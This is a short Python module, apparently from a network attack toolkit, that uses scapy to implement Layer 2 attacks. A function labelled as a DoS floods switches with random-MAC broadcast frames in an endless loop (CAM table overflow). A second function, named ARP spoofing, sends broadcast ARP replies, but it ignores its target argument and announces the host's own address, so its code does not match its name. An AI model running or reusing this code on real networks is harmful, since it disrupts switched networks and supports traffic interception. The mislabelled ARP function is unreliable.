from scapy.layers.l2 import Ether, ARP
from scapy.volatile import RandMAC
from scapy.sendrecv import sendp
from scapy.all import get_if_hwaddr, get_if_addr

from libs.aux_funcs import type_wrapper



@type_wrapper(category = "attack", name = "CAM Overflow", type = "DoS", layer = "Layer 2")
def cam_overflow(iface):
    try:
        while True:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
            sendp(pkt, iface=iface)
    except KeyboardInterrupt:
        return


@type_wrapper(category = "middleware", name = "ARP Spoofing", type = "periodic", layer = "Layer 2")
def arp_spoofing(iface, target_ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(iface))/ARP(op=2, hwsrc=get_if_hwaddr(iface), hwdst="ff:ff:ff:ff:ff:ff", psrc=get_if_addr(iface), pdst="255.255.255.255")
    sendp(pkt, iface=iface)
